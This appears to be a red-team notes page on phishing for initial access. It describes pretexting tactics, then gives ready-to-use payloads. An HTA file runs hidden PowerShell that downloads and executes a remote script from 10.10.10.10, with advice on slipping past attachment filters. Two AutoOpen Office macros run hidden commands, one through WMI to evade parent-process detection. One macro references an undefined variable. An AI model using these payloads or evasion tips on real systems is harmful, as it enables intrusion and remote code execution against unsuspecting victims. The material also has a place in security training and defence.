## Phishing

Phishing is one of the most common forms of initial compromise. Pretexts usually invoke feelings of fear and urgency in the target. A common tactic is to pretext the situation in a way that the victim's brain remains in "alpha" mode. This means they're unaware of a potential suspicious situation and blindly follow what they're reading. 

Consider this: You've recently posted on social media regarding a holiday. You have a lovely time in the Bahamas and have a great tan to show off back home. You've moaned about the plane being slightly delayed online. 3 days after you return, you receive an email from <INSERT AIRLINE> regarding compensation for your delay. You did have a delay, and did just fly recently, so you follow their suggestion and apply for reimbursement. You use the same password you use for your corporate network, maybe adding a symbol. 

Plot twist, that's not from the airline and you aren't getting compensation! 

There's many, many ways to pretext a phishing situation. Always be vigilant.

## HTA Files

HTA files are a common attack vector, though require mshta to be installed to execute (Part of IE). The following payload executes the command shown when run. Note the full path to a 64-bit PowerShell. Mshta runs by default as a 32-bit program and thus looking for `powershell` executes it from the 32-bit location! Either attach an HTA file or provide a download link. The link is more malleable long term and also doesn't get yoinked by defensive filtering on attachments.

```html
<html>
  <head>
    <title>HTA File</title>
  </head>
  <body>
  </body>

  <script language="VBScript">
    Function Cmd()
      Set shell = CreateObject("wscript.Shell")
      shell.run "C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c ""IEX ((New-Object System.Net.Webclient).downloadstring('http://10.10.10.10/updates.txt'))"""
    End Function

    Cmd
  </script>
</html>
```

## Office Macros

We can obviously use Office Macros, although this is becoming more obsolete with the tighter controls being implemented on it. Nonetheless, here is some code for it.

This will create a child process of msword, which is commonly going to be fingerprinted by defenders 🚩
```vb
Sub AutoOpen()
PowershellTest
End Sub

Sub Wait(n As Long)
Dim t As Date
t = Now
Do
    DoEvents
Loop Until Now >= DateAdd("s", n, t)
End Sub

Sub PowershellTest()

Dim cradle As String

MsgBox ("Bad idea!")
cradle = "cmd.exe /c ping 10.10.10.10"
Shell cradle, vbHide
Wait (5)
Shell downloadedFile, vbHide

End Sub
``` 

You may have more succecss using WMI - Windows Management Instruments - to spawn a process under WmiPrvSE. Adjust command as necessary. Nice to start with a ping on labs to see if it's working at least.
```vb
Sub AutoOpen()
wmiTest
End Sub

Sub Wait(n As Long)
Dim t As Date
t = Now
Do
    DoEvents
Loop Until Now >= DateAdd("s", n, t)
End Sub

Sub wmiTest()

Dim wmi As Object 

Set cmd = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")  
cmd.Create "cmd.exe /c ping 10.10.10.10"

End Sub
``` 